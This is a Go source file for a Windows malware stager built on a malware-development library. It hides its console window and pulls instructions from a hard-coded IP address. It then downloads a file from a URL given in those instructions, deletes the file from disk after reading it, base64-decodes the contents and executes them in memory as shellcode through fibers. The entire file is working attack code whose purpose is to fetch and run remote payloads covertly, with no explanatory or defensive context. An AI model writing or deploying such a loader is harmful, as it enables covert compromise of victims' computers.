package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"syscall"

	"github.com/D3Ext/maldev/network"
	"github.com/D3Ext/maldev/shellcode"
	//"crypto"
)

var h = HConsole()

// ALWAYS HAVE STRUCT FIELDS CAPITAL FIRST LETTER. FIX THIS IN YOUR OTHER PROJECT
type Config struct {
	DlURL    string `json:"dlURL"`
	FileName string `json:"fileName"`
	PathNew  string `json:"pathNew"`
}

func main() {
	//HConsole()
	var config Config
	url := "http://192.168.0.106/instr"
	//fmt.Println("Hello Worlds")
	response, err := http.Get(url)
	if err != nil {
		log.Fatal(err)
	}
	defer response.Body.Close()
	if response.StatusCode != http.StatusOK {
		log.Fatal(err)
		os.Exit(1)
	}
	bodyBytes, _ := io.ReadAll(response.Body)
	fmt.Println(string(bodyBytes))
	err = json.Unmarshal(bodyBytes, &config)
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
	//fmt.Println(config)
	//fmt.Println("[+]Getting Files From:" + config.DlURL + "/" + config.FileName)
	network.DownloadFile(config.DlURL + "/" + config.FileName)
	os.Rename(config.FileName, config.PathNew)
	//fmt.Println("[+]Moving to: " + config.PathNew)
	contents, _ := os.ReadFile(config.PathNew)
	os.Remove(config.PathNew)
	//contentsStr := string(contents)
	contentsNew := contents
	base64.RawStdEncoding.Decode(contentsNew, contents)
	err = shellcode.Fibers(contents)
	if err != nil {
		log.Fatal(err)
	}
}

func HConsole() int {
	FreeConsole := syscall.NewLazyDLL("kernel32.dll").NewProc("FreeConsole")
	FreeConsole.Call()
	return 0
}
